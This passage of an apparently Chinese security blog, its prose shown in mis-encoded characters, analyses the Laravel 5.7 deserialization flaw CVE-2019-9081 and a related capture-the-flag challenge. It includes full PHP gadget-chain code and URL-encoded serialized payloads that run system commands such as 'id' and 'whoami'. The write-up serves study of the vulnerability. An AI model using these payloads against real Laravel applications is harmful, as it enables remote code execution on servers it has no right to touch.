alt="-w872"><br>å…¶æ¬¡çœ‹ä¸€ä¸‹å…³é”®çš„<code>run</code>æ–¹æ³•ï¼Œè¿™å…¶ä¸­æœ‰ä¸¤ä¸ªä½ç½®çš„ä»£ç æ¯”è¾ƒå…³é”®ã€‚ä¸€ä¸ªæ˜¯ä¸ä»£ç æ‰§è¡Œç›´æ¥ç›¸å…³çš„ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯ä¸åˆ°è¾¾ä»£ç æ‰§è¡Œä½ç½®ç›¸å…³çš„æ–¹æ³•<code>mockConsoleOutput</code>ã€‚æˆ‘ä»¬å¿…é¡»ä¿è¯æ–¹æ³•<code>mockConsoleOutput</code>å¯ä»¥æ­£å¸¸æ‰§è¡Œå®Œæ¯•ã€‚<br><img src="https://i.loli.net/2020/06/28/by7fIQELspNUPJt.png" alt="-w1145"><br>æ‰€æœ‰æ¥ä¸‹æ¥å°±çœ‹ä¸€ä¸‹<code>mockConsoleOutput</code>æ–¹æ³•ã€‚ç”±äºç¨‹åºå¯ä»¥æ­£å¸¸æ‰§è¡Œåˆ°166è¡Œçš„ä½ç½®ï¼Œæ‰€ä»¥å¯¹162è¡Œçš„ä»£ç å°±ä¸éœ€è¦è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æã€‚<br><img src="https://i.loli.net/2020/06/28/YgOF1ZjoGQC72qx.png" alt="-w893"><br>åˆ†æçš„å…³é”®åœ¨äº166è¡Œçš„çš„å±æ€§éå†ã€‚è¦æ§åˆ¶è¿™ä¸ªæ•°ç»„æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ª<code>public function __get</code>é­”æœ¯æ–¹æ³•å°±å¥½äº†ã€‚ä¸€æœä¸€å¤§æŠŠï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©<code>Faker/DefaultGenerator</code>ç±»ä¸­çš„ã€‚<br><img src="https://i.loli.net/2020/06/28/8Smulv4HJPdDk5s.png" alt="-w1014"><br>åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªPoCæ¥è¿›è¡ŒåŠ¨æ€åˆ†æä¸€ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œä¹‹åçš„ç»“æœ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A0%3A%7B%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè¿‡äº†<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>ä¸­çš„ç¬¬166è¡Œçš„ä»£ç <br><img src="https://i.loli.net/2020/06/28/8nlj2XRaBCysz4v.png" alt="-w1078"><br>å¯ä»¥åˆ°è¾¾å…³é”®çš„136è¡Œä»£ç å¤„ã€‚<br><img src="https://i.loli.net/2020/06/28/26UT9BshukNJHCi.png" alt="-w1133"><br>ä½†æ˜¯å†å¾€ä¸‹èµ°çš„ç¨‹åºå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥è¦å¯¹136å¤„çš„ä»£ç è¿›è¡Œè¯¦ç»†çš„åˆ†æã€‚<br><img src="https://i.loli.net/2020/06/28/yGaVL2c6vEtHgj5.png" alt="-w1077"><br>è¿™ç§é“¾å¼è°ƒç”¨ä¸å¤ªå¥½çœ‹å˜é‡ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘åœ¨136è¡Œä¹‹å‰è¡¥å……å‡ è¡Œä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$kclass = Kernel::class;</span><br><span class="line">$app = <span class="keyword">$this</span>-&gt;app[Kernel::class];</span><br></pre></td></tr></table></figure></p><p>åŠ¨æ€è°ƒè¯•çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°<code>Kernel::class</code>ä¸­çš„å€¼æ˜¯<code>Illuminate\Contracts\Console\Kernel</code>ã€‚è€Œå¯¹åº”çš„<code>$app = $this-&gt;app[Kernel::class];</code>ä»£ç åœ¨æ‰§è¡Œæ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è·Ÿè¿›è¿™ä¸ªéƒ¨åˆ†ã€‚ç»§ç»­è·Ÿè¿›ä¹‹ååˆ°è¾¾<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>æ–‡ä»¶ä¸­ã€‚æˆ‘åœ¨åŠ¨æ€åˆ†æçš„æ—¶å€™å‘ç°<code>Illuminate\Container\Container</code>ç±»ä¸­è°ƒç”¨çš„æ˜¯<code>Illuminate\Container\BoundMethod</code> çš„ <code>call</code> é™æ€æ–¹æ³•ã€‚è¿˜æœ‰åˆ«å¿˜äº†<code>Illuminate\Foundation\Application</code>ç±»ç»§æ‰¿çš„æ˜¯ <code>Illuminate\Container\Container</code>ç±»çš„callæ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ç»§ç»­å¾€ä¸‹è·Ÿã€‚<br><img src="https://i.loli.net/2020/06/28/GSDoW6CO7ju5FRw.png" alt="-w894"><br>ç»§ç»­è·Ÿè¿›ä¹‹åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®å‡½æ•°<code>call_user_func_array</code>ã€‚ç»§ç»­è·Ÿè¿› <code>getMethodDependencies</code> å‡½æ•°ã€‚è¯¥å‡½æ•°è¿”å›çš„æ˜¯ <code>$dependencies</code> æ•°ç»„å’Œ <code>$parameters</code> çš„åˆå¹¶æ•°æ®ï¼Œå…¶ä¸­<code>$dependencies</code>é»˜è®¤ä¸ºç©ºæ•°ç»„ï¼Œè€Œ <code>$parameters</code> ä¸ºå¯æ§æ•°æ®ã€‚<br><img src="https://i.loli.net/2020/06/28/rymOvWD8LYzs4Kk.png" alt="-w1058"><br>å†åŠ ä¸Šæ­¤å¤„<code>$callback</code>çš„å€¼å°±æ˜¯æˆ‘ä»¬å¯æ§çš„å€¼<code>system</code>ï¼Œå› æ­¤æ­¤å¤„çš„å®é™…å½¢å¼ä¸º<code>call_user_func_array(å¯æ§æ•°æ®,å¯æ§æ•°æ®)</code>ï¼Œå¯ä»¥æ„æˆä»»æ„ä»£ç æ‰§è¡Œã€‚æœ€ç»ˆæ„é€ çš„POPé“¾å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/28/4vfwJAILg7Trt3X.jpg" alt="-w1493"></p><h3 id="0x05-CVE-2019-9081çš„å‚è€ƒé“¾æ¥"><a href="#0x05-CVE-2019-9081çš„å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 CVE-2019-9081çš„å‚è€ƒé“¾æ¥"></a>0x05 CVE-2019-9081çš„å‚è€ƒé“¾æ¥</h3><ol><li><a href="https://xz.aliyun.com/t/5483" target="_blank" rel="noopener">Laravel5.7ååºåˆ—åŒ–æ¼æ´ä¹‹RCEé“¾æŒ–æ˜</a></li><li><a href="https://www.cnblogs.com/tr1ple/p/11079354.html" target="_blank" rel="noopener">ä»£ç å®¡è®¡ä¹‹CVE-2019-9081 Laravel5.7 ååºåˆ—åŒ– RCEå¤ç°åˆ†æ</a></li><li><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">laravelv5.7ååºåˆ—åŒ–rce(CVE-2019-9081)</a></li></ol><h3 id="0x06-ç¬¬äº”ç©ºé—´â€“laravel"><a href="#0x06-ç¬¬äº”ç©ºé—´â€“laravel" class="headerlink" title="0x06 ç¬¬äº”ç©ºé—´â€“laravel"></a>0x06 ç¬¬äº”ç©ºé—´â€“laravel</h3><p>Diffä¸€ä¸‹çš„å‘ç°å…¶å®é¢˜ç›®ä¸­æ‰€åšçš„ä¿®æ”¹ä»…ä»…æ˜¯åˆ é™¤äº†<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>æ–‡ä»¶ä¸­çš„<code>$this-&gt;run();</code>è¿™ä¸€è¡Œä»£ç ã€‚æ²¡æœ‰è¿™ä¸ªè°ƒç”¨ç‚¹ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯åœ¨å…¶ä¸­æ‰¾ä¸€ä¸ª<code>call_user_func</code>æ¥æ‰§è¡Œ<code>Illuminate/Foundation/Testing/PendingCommand</code>ç±»ä¸­çš„<code>run</code>æ–¹æ³•ã€‚<br><img src="https://i.loli.net/2020/06/28/BZt24oINVxg36iz.png" alt="-w1050"><br>æ­¤å¤„æˆ‘ä»¬ä½¿ç”¨<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>æ–‡ä»¶ä¸­çš„<code>call_user_func</code>å‡½æ•°æ¥å®Œæˆå¯¹<code>run</code>çš„è°ƒç”¨<br><img src="https://i.loli.net/2020/06/28/PnVRAUZWHGxfi27.png" alt="-w931"><br>è¿™ä¸ªæ€è·¯å…¶å®å¹¶ä¸æ˜¯æ–°çš„ï¼ŒPHPGGCå½“ä¸­å°±ç»å¸¸åªç”¨è¿™ä¸ªç‚¹ï¼Œå› ä¸º<code>ValidGenerator</code>ç±»ä¸­çš„<code>__call</code>æ¯”è¾ƒå¥½åˆ©ç”¨ï¼Œè€Œå…¶ä¸­åˆåŒ…å«äº†<code>call_user_func_array</code>ã€<code>call_user_func</code>ã€‚æ‰€ä»¥ç»“åˆè¿™ä¸ªç‚¹å¾ˆå®¹æ˜“å°±æ„é€ å‡ºä¸‹é¢è¿™ä¸ªExpã€‚å…·ä½“çš„ä¸åœ¨å¤šå†™ï¼Œå¦‚æœæœ‰ä¸æ¸…æ¥šçš„å¯ä»¥çœ‹åé¢çš„å‚è€ƒé“¾æ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Expæ¥è‡ªchamd5 wp</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters, $class, $app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings = $bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CollectionConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">public</span> $collection;</span><br><span class="line">        <span class="keyword">public</span> $prefixes;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;prefixes = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;collection = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($validator)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RouteCollection</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//chain.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"gadgets.php"</span>;</span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">    <span class="string">"system"</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>), <span class="string">"expectedQuestions"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>))),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; <span class="keyword">array</span>(<span class="string">"concrete"</span> =&gt; <span class="string">"Illuminate\Foundation\Application"</span>)))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Faker\ValidGenerator(<span class="keyword">array</span>($payload, <span class="string">"run"</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator($a)));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/RErawMfy9oPpqBS.png" alt="-w1133"></p><h3 id="0x07-ç¬¬äº”ç©ºé—´laravelé¢˜è§£å‚è€ƒ"><a href="#0x07-ç¬¬äº”ç©ºé—´laravelé¢˜è§£å‚è€ƒ" class="headerlink" title="0x07 ç¬¬äº”ç©ºé—´laravelé¢˜è§£å‚è€ƒ"></a>0x07 ç¬¬äº”ç©ºé—´laravelé¢˜è§£å‚è€ƒ</h3><ol><li><a href="https://mp.weixin.qq.com/s/TyJsK5Rkg6MXvADS13RIcA" target="_blank" rel="noopener">ç¬¬äº”ç©ºé—´-WriteUp</a></li><li><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹å¯»æ‰¾POPé“¾(ä¸€)</a></li><li><a 